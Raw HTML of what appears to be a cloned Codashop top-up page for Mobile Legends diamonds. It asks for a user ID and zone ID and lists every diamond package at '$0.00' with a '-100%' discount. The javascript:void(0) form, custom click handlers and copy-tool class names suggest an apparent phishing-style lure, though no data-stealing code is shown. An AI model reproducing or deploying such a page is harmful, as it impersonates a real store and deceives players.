<path d="M3.55703 4.78626L1.55576 5.23521C1.38835 5.27326 1.23617 5.12107 1.2666 4.95367L1.67751 2.91435C1.71556 2.72412 1.94384 2.65563 2.08081 2.7926L2.34714 3.05893C3.31353 1.68163 4.97998 0.829381 6.83667 1.03483C9.05861 1.27833 10.8316 3.04371 11.0751 5.26565C11.3947 8.16483 9.13471 10.6227 6.29641 10.6227C3.75487 10.6227 1.6699 8.65183 1.49488 6.14834C1.49488 6.04942 1.56337 5.97332 1.66229 5.97332H2.49932C2.59825 5.97332 2.68195 6.04942 2.68956 6.14834C2.85696 7.92133 4.29514 9.32906 6.09095 9.42798C8.2368 9.54973 10.025 7.76914 9.91086 5.62329C9.81194 3.71334 8.22919 2.19146 6.29641 2.19146C4.9952 2.19146 3.84618 2.88391 3.207 3.91879L3.66356 4.37535C3.79292 4.50471 3.73204 4.73299 3.54942 4.77865L3.55703 4.78626Z" fill="#BC6422"></path>
<path d="M3.42031 5.18958L1.41904 5.63853C1.25163 5.67658 1.09945 5.52439 1.12988 5.35699L1.54079 3.31767C1.57884 3.12744 1.80712 3.05895 1.94409 3.19592L2.21042 3.46225C3.17681 2.08495 4.84326 1.2327 6.69995 1.43815C8.92189 1.68165 10.6949 3.44703 10.9384 5.66897C11.258 8.56815 8.99799 11.026 6.15969 11.026C3.61815 11.026 1.53318 9.05515 1.35817 6.55166C1.35817 6.45274 1.42665 6.37664 1.52557 6.37664H2.3626C2.46153 6.37664 2.54523 6.45274 2.55284 6.55166C2.72025 8.32465 4.15842 9.73238 5.95423 9.8313C8.10008 9.95305 9.88829 8.17246 9.77415 6.02661C9.67522 4.11666 8.09247 2.59478 6.15969 2.59478C4.85848 2.59478 3.70947 3.28723 3.07028 4.32211L3.52684 4.77867C3.6562 4.90803 3.59532 5.13631 3.4127 5.18197L3.42031 5.18958Z" fill="#68250E"></path>
<path d="M3.68689 4.06348L3.2151 3.92651L3.07812 4.32981L3.74014 4.26894L3.68689 4.06348Z" fill="#BC6422"></path>
</g>
</g>
<defs>
<clipPath id="reward_svg__clip0_3_25">
<rect width="12" height="12" fill="white"></rect>
</clipPath>
</defs>
</svg>
</div>
<!---->
</div>
<button data-variant="primary" data-size="small" data-loading="false" class="button-solid button-solid--with-content header__container__items__signup" data-v-cb5174a2 data-v-45cd0733>
<!--[-->
<!--]-->
<span class="button-solid__inner" data-v-45cd0733>
<span class="button-solid__inner__content--icon-prefix overflow-hidden button-solid__inner__content" data-v-45cd0733>
<!---->
<span class="truncate button-solid__inner__content__slot" data-v-45cd0733>
<!--[-->
Login
<!--]-->
</span>
</span>
<svg class="animate-spin stroke-current button-solid__inner__spinner" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-v-45cd0733>
<g class="origin-center animate-[rotate_2s_linear_infinite]">
<circle class="animate-[circle_1.5s_ease-in-out_infinite]" cx="12" cy="12" r="9.5" fill="none" stroke-width="3" stroke-linecap="round"></circle>
</g>
</svg>
</span>
</button>
</div>
<span data-v-cb5174a2></span>
</header>
<main class="layout__content" data-v-ce79952d>
<div class="layout__content__inner" data-v-ce79952d>
<!--[-->
<div>
<span></span>
<div data-v-f4592d14>
<span data-v-f4592d14></span>
<div class="product__purchase-form" data-v-f4592d14>
<!--[-->
<section class="product-hero-container" data-v-f4592d14 data-v-87db9dab>
<div class="product-hero" style="" data-v-87db9dab>
<div class="product-hero__tile" data-v-87db9dab>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="Mobile Legends" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg 1x, https://cdn1.codashop.com/S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg 2x" class="product-hero__tile__image" data-testid="product-hero-tile" src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg" data-v-87db9dab>
</div>
<div class="product-hero__content" data-v-87db9dab>
<h2 class="product-hero__title" data-testid="product-hero-title" data-v-87db9dab>Mobile Legends: Bang Bang</h2>
<div class="trust-tag trust-tag--dark product-hero__trust-tag" data-testid="product-hero-trust-tag" data-v-87db9dab data-v-138d6f59>
<div class="trust-tag__icon" data-v-138d6f59>
<svg width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-138d6f59>
<path d="M12 7L13.3225 10.1797L16.7553 10.4549L14.1399 12.6953L14.9389 16.0451L12 14.25L9.06107 16.0451L9.86012 12.6953L7.24472 10.4549L10.6775 10.1797L12 7Z" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
<path d="M12 3L18.364 5.63604L21 12L18.364 18.364L12 21L5.63604 18.364L3 12L5.63604 5.63604L12 3Z" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg>
</div>
<span class="trust-tag__label" data-v-138d6f59>Secure Payments</span>
</div>
</div>
</div>
<div class="product-hero__description" data-v-87db9dab>
<p class="shop-content--paragraph">Codashop offers easy, safe and convenient ML top ups.</p>
<p class="shop-content--paragraph">Pay conveniently with Codacash.</p>
<p class="shop-content--paragraph">Buy Mobile Legends Diamonds, in seconds! Simply enter your Mobile Legends user ID and zone ID, select the item you wish to purchase, complete the payment, and the item will be instantly delivered to your Mobile Legends account.</p>
<p class="shop-content--paragraph">
<a href="https://www.codashop.com/en-my/sign-in" target="_blank">Sign in to your Codashop account</a>
and get access to Mobile Legends promotions &amp;events. Don’t have a Codashop account yet? <a href="/" target="_blank">Sign up today!</a>
</p>
<p class="shop-content--paragraph">Download &amp;play Mobile Legends today!</p>
<a class="shop-content--badge" href="https://apps.apple.com/app/id1160056295?country=my" rel="noopener" target="_blank">
<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store">
</a>
<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.mobile.legends&amp;country=my" rel="noopener" target="_blank">
<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play">
</a>
<p></p>
</div>
</section>
<!--]-->
<div class="product__purchase-steps-container" data-v-f4592d14>
<!---->
<div style="" data-v-f4592d14>
<form data-v-50ce566c="" action="javascript:void(0)" method="post" id="processOrderForm">
<span data-v-f4592d14></span>
<div id="step-user-id" class="product__purchase-step__container" data-testid="purchase-step-userid" data-v-f4592d14 data-v-36889fac>
<!---->
<div class="product__purchase-step__heading" data-v-36889fac>
<h2 id="step-user-id-heading" data-v-36889fac>
<span class="product__purchase-step__icon" data-v-36889fac></span>
<span class="product__purchase-step__title" data-v-36889fac>Enter User ID</span>
<!---->
</h2>
</div>
<!---->
<div class="product__purchase-step__content" data-v-36889fac>
<!--[-->
<div class="user-identification" data-v-f4592d14 data-v-ef9ee35f>
<!---->
<div class="user-identification__fields-container" data-v-ef9ee35f>
<div class="user-identification__fields" data-v-ef9ee35f>
<!--[-->
<div class="user-identification__fields__field" data-v-ef9ee35f>
<div class="text-field" data-theme="lightTheme" data-testid="form-text-field" required data-auto-capture="userIdInputClick" data-v-ef9ee35f data-v-e99e18b7>
<div class="text-field__input-container--full-width text-field__input-container" data-v-e99e18b7>
<input type="tel" placeholder="Enter User ID" name="userId" id="userId" value="" value="" minlength="6" autocomplete="on" class="text-field__input-container__input peer text-field__input-container__input--default" data-v-e99e18b7>
<!---->
<!---->
<!---->
<!---->
</div>
<!---->
<span data-v-e99e18b7></span>
</div>
</div>
<div class="user-identification__fields__field" data-v-ef9ee35f>
<div class="text-field" data-theme="lightTheme" data-testid="form-text-field" required data-auto-capture="userIdInputClick" data-v-ef9ee35f data-v-e99e18b7>
<div class="text-field__input-container--full-width text-field__input-container" data-v-e99e18b7>
<input type="tel" placeholder="Zone ID" name="zoneId" id="zoneId" value="" value="" minlength="4" autocomplete="on" class="text-field__input-container__input peer text-field__input-container__input--left-icon text-field__input-container__input--right-icon text-field__input-container__input--default" data-v-e99e18b7>
<div class="text-field__input-container__left-icon" data-v-e99e18b7>
<!--[-->
<span class="left-parenthesis" data-v-ef9ee35f></span>
<!--]-->
</div>
<div class="text-field__input-container__right-icon" data-v-e99e18b7>
<!--[-->
<span class="right-parenthesis" data-v-ef9ee35f></span>
<!--]-->
</div>
<!---->
<!---->
</div>
<!---->
<span data-v-e99e18b7></span>
</div>
</div>
<!--]-->
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="user-identification__tooltip user-identification__tooltip-container" data-testid="user-id-tooltip" data-v-ef9ee35f data-v-aefa0023 onclick="open_help()">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM11 17C11 16.4477 11.4477 16 12 16H12.01C12.5623 16 13.01 16.4477 13.01 17C13.01 17.5523 12.5623 18 12.01 18H12C11.4477 18 11 17.5523 11 17ZM13.3829 6.30376C12.7011 6.02173 11.9546 5.93377 11.2259 6.0496C10.4972 6.16543 9.8148 6.48054 9.25407 6.96009C8.69335 7.43963 8.27618 8.06492 8.04871 8.76679C7.87844 9.29218 8.16632 9.85611 8.6917 10.0264C9.21708 10.1966 9.78102 9.90878 9.95129 9.3834C10.065 9.03246 10.2736 8.71982 10.554 8.48004C10.8343 8.24027 11.1755 8.08272 11.5399 8.0248C11.9042 7.96689 12.2775 8.01087 12.6184 8.15188C12.9593 8.2929 13.2545 8.52545 13.4715 8.82382C13.6884 9.12219 13.8186 9.47476 13.8477 9.84252C13.8845 10.3086 13.8462 10.5911 13.7144 10.8499C13.5411 11.1902 13.3428 11.4235 12.9774 11.6474C12.627 11.8622 12.1848 12 11.8539 12C11.3016 12 10.8539 12.4477 10.8539 13C10.8539 13.5523 11.3016 14 11.8539 14C12.6297 14 13.4294 13.7162 14.0226 13.3526C14.7239 12.9227 15.1677 12.4034 15.4966 11.7575C15.8671 11.0301 15.8918 10.3222 15.8414 9.68504C15.7833 8.94951 15.523 8.24439 15.0891 7.64764C14.6551 7.0509 14.0646 6.58579 13.3829 6.30376Z"></path>
</svg>
</div>
</div>
<div data-v-b0aec932="" data-v-ef9ee35f="" class="profile-badge-container" id="userLoad" style="display: none;">
<!---->
<span data-v-b0aec932="" data-variant="current" data-size="small" class="inline-block rounded-[3px] px-[8px] py-[4px] font-semibold text-neutral-70 current:bg-portal-10 pending:bg-orange-20 default:bg-neutral-10 error:bg-red-10 error:text-red-60 success:bg-green-5 success:text-green-60 profile-badge">
<div data-v-b0aec932="" class="profile-badge__inner">
<svg data-v-b0aec932="" class="animate-spin stroke-current profile-badge__inner__loading-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<g class="origin-center animate-[rotate_2s_linear_infinite]">
<circle class="animate-[circle_1.5s_ease-in-out_infinite]" cx="12" cy="12" r="9.5" fill="none" stroke-width="3" stroke-linecap="round"></circle>
</g>
</svg>
<!---->
<div data-v-b0aec932="" class="profile-badge__inner__text">Being checked...</div>
</div>
</span>
</div>
<div data-v-b0aec932="" data-v-ef9ee35f="" class="profile-badge-container snipcss-b9oNU" id="userError" style="display: none;">
<span data-v-b0aec932="" data-variant="error" data-size="small" class="inline-block rounded-[3px] px-[8px] py-[4px] font-semibold text-neutral-70 current:bg-portal-10 pending:bg-orange-20 default:bg-neutral-10 error:bg-red-10 error:text-red-60 success:bg-green-5 success:text-green-60 profile-badge" data-error-scroll="true">
<div data-v-b0aec932="" class="profile-badge__inner">
<div data-v-b0aec932="" class="profile-badge__inner__text">We didn't find the User ID:</div>
</div>
</span>
</div>
<div class="user-identification__instructions-container" data-v-ef9ee35f>
<div class="user-identification__instructions" data-testid="user-id-instructions" data-v-ef9ee35f data-v-0480fbda>To find your User ID, click on your avatar in the top left corner of the main game screen. Then go to the "Basic Info" tab. Your user ID is shown below your nickname. Please input the complete user ID here, e.g. 12345678(1234).</div>
</div>
<div data-v-b0aec932="" data-v-ef9ee35f="" class="profile-badge-container" id="userShow" style="display: none;">
<p data-v-b0aec932="" class="profile-badge-verified-text">Welcome</p><span data-v-b0aec932="" data-variant="success" data-size="small" class="inline-block rounded-[3px] px-[8px] py-[4px] font-semibold text-neutral-70 current:bg-portal-10 pending:bg-orange-20 default:bg-neutral-10 error:bg-red-10 error:text-red-60 success:bg-green-5 success:text-green-60 profile-badge">
<div data-v-b0aec932="" class="profile-badge__inner"><svg data-v-b0aec932="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="profile-badge__inner__success-icon">
<path fill="#007547" fill-rule="evenodd" d="M2.56 12c0-5.346 4.334-9.68 9.68-9.68s9.68 4.334 9.68 9.68-4.334 9.68-9.68 9.68S2.56 17.346 2.56 12Z" clip-rule="evenodd"></path>
<path fill="#fff" fill-rule="evenodd" d="M16.913 8.518a.88.88 0 0 1 0 1.244l-5.462 5.72a.88.88 0 0 1-1.245 0l-2.64-2.64a.88.88 0 1 1 1.245-1.244l2.018 2.017 4.84-5.097a.88.88 0 0 1 1.244 0Z" clip-rule="evenodd"></path>
</svg>
<div data-v-b0aec932="" class="profile-badge__inner__text"></div>
</div>
</span>
</div>
<input type="hidden" name="userName" id="userName" value="">
</div>
<!--]-->
</div>
</div>

<div id="step-sku" class="product__purchase-step__container" data-testid="purchase-step-skus" data-v-7fb7d351 data-v-36889fac>
<!---->
<div class="product__purchase-step__heading" data-v-36889fac>
<h2 id="step-sku-heading" data-v-36889fac>
<span class="product__purchase-step__icon" data-v-36889fac></span>
<span class="product__purchase-step__title" data-v-36889fac>Select Top Up</span>
<!---->
</h2>
</div>
<!---->
<div class="product__purchase-step__content" data-v-36889fac>
<!--[-->
<!--[-->

<div name="sku" data-v-7fb7d351 data-v-546825a6>
<!--[-->
<div id="headlessui-radiogroup-v-0-2-0" role="radiogroup">
<!--[-->
<section id="category-102" data-testid="category-section" class="mt-4" data-v-546825a6>
<h2 class="sku-list__category-name" data-testid="category-section-title" data-v-546825a6>2x Recharge Bonus</h2>
<div data-v-546825a6 data-v-556f6ca7>
<div class="category__banner" data-testid="category-banner" data-v-556f6ca7>
<div class="category__banner-image" data-v-556f6ca7>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="2x Recharge Bonus" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-category-image/MLBB/Diamond%201-First%20Recharge-268x246.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-category-image/MLBB/Diamond%201-First%20Recharge-268x246.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-category-image/MLBB/Diamond%201-First%20Recharge-268x246.png" data-v-556f6ca7>
</div>
<div class="category__banner__content" data-v-556f6ca7>
<div class="category__banner__content-title" data-testid="category-banner-title" data-v-556f6ca7>2x Recharge Bonus</div>
<div class="category__banner__content-description" data-v-556f6ca7>During this event, players who haven't recharged the 50/150/250/500 tiers of Diamonds through other platforms can enjoy a double bonus on their first purchase of the following items.</div>
<div data-v-556f6ca7>
<!---->
</div>
</div>
</div>
<span data-v-556f6ca7></span>
</div>
<div class="sku-list" data-v-546825a6>
<!--[-->
<div id="headlessui-radiogroup-option-v-0-2-1" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25520" class="sku-card" data-testid="sku-item-tile-25520" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom1');" capture-custom-sku-id="25520" capture-custom-sku-name="100 Diamonds (50+50) first recharge!" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>100 Diamonds (50+50) first recharge!</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="100 Diamonds (50+50) first recharge!" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/first%20recharge150_MLBB_NewDemom-min.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/first%20recharge150_MLBB_NewDemom-min.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/first%20recharge150_MLBB_NewDemom-min.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25520" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$1.07</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="best-value-tag" data-v-c49af8b5 data-v-17d42e35>
<span class="best-value-tag--shimmer" data-v-17d42e35></span>
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="best-value-tag__icon" data-v-17d42e35>
<path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.69L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18C18.83 21 19.54 20.5 19.84 19.78L22.86 12.73C22.95 12.5 23 12.26 23 12V10Z"></path>
</svg>
<span class="best-value-tag__text" data-v-17d42e35>HOT</span>
</div>
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-3" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25521" class="sku-card" data-testid="sku-item-tile-25521" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom2');" capture-custom-sku-id="25521" capture-custom-sku-name="300 Diamonds (150+150) first recharge!" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>300 Diamonds (150+150) first recharge!</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="300 Diamonds (150+150) first recharge!" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25521" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$5.50</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="best-value-tag" data-v-c49af8b5 data-v-17d42e35>
<span class="best-value-tag--shimmer" data-v-17d42e35></span>
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="best-value-tag__icon" data-v-17d42e35>
<path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.69L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18C18.83 21 19.54 20.5 19.84 19.78L22.86 12.73C22.95 12.5 23 12.26 23 12V10Z"></path>
</svg>
<span class="best-value-tag__text" data-v-17d42e35>HOT</span>
</div>
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-3" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25521" class="sku-card" data-testid="sku-item-tile-25521" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom3');" capture-custom-sku-id="25521" capture-custom-sku-name="500 Diamonds (250+250) first recharge!" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>500 Diamonds (250+250) first recharge!</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="500 Diamonds (250+250) first recharge!" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%202%20First%20Recharge-150x150.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25521" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$5.50</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="best-value-tag" data-v-c49af8b5 data-v-17d42e35>
<span class="best-value-tag--shimmer" data-v-17d42e35></span>
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="best-value-tag__icon" data-v-17d42e35>
<path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.69L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18C18.83 21 19.54 20.5 19.84 19.78L22.86 12.73C22.95 12.5 23 12.26 23 12V10Z"></path>
</svg>
<span class="best-value-tag__text" data-v-17d42e35>HOT</span>
</div>
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-4" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25522" class="sku-card" data-testid="sku-item-tile-25522" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom4');" capture-custom-sku-id="25522" capture-custom-sku-name="1000 Diamonds (500+500) first recharge!" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>1000 Diamonds (500+500) first recharge!</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="1000 Diamonds (500+500) first recharge!" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25522" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$10.68</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="best-value-tag" data-v-c49af8b5 data-v-17d42e35>
<span class="best-value-tag--shimmer" data-v-17d42e35></span>
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="best-value-tag__icon" data-v-17d42e35>
<path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.69L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18C18.83 21 19.54 20.5 19.84 19.78L22.86 12.73C22.95 12.5 23 12.26 23 12V10Z"></path>
</svg>
<span class="best-value-tag__text" data-v-17d42e35>HOT</span>
</div>
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-4" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25522" class="sku-card" data-testid="sku-item-tile-25522" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom5');" capture-custom-sku-id="25522" capture-custom-sku-name="3000 Diamonds (1500+1500) first recharge!" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>3000 Diamonds (1500+1500) first recharge!</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="3000 Diamonds (1500+1500) first recharge!" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/Diamond%203%20First%20Recharge-150x150.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25522" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$18.68</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="best-value-tag" data-v-c49af8b5 data-v-17d42e35>
<span class="best-value-tag--shimmer" data-v-17d42e35></span>
<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="best-value-tag__icon" data-v-17d42e35>
<path d="M1 21H5V9H1V21ZM23 10C23 8.9 22.1 8 21 8H14.69L15.64 3.43L15.67 3.11C15.67 2.7 15.5 2.32 15.23 2.05L14.17 1L7.59 7.59C7.22 7.95 7 8.45 7 9V19C7 20.1 7.9 21 9 21H18C18.83 21 19.54 20.5 19.84 19.78L22.86 12.73C22.95 12.5 23 12.26 23 12V10Z"></path>
</svg>
<span class="best-value-tag__text" data-v-17d42e35>HOT</span>
</div>
<!--]-->
</div>
</div>
<!--]-->
</div>
</section>
<section id="category-3" data-testid="category-section" class="mt-4" data-v-546825a6>
<h2 class="sku-list__category-name" data-testid="category-section-title" data-v-546825a6>Diamonds</h2>
<!---->
<div class="sku-list" data-v-546825a6>
<!--[-->
<div id="headlessui-radiogroup-option-v-0-2-5" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25523" class="sku-card" data-testid="sku-item-tile-25523" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom6');" capture-custom-sku-id="25523" capture-custom-sku-name="1160 Diamonds" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card--popular sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>1160 Diamonds</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
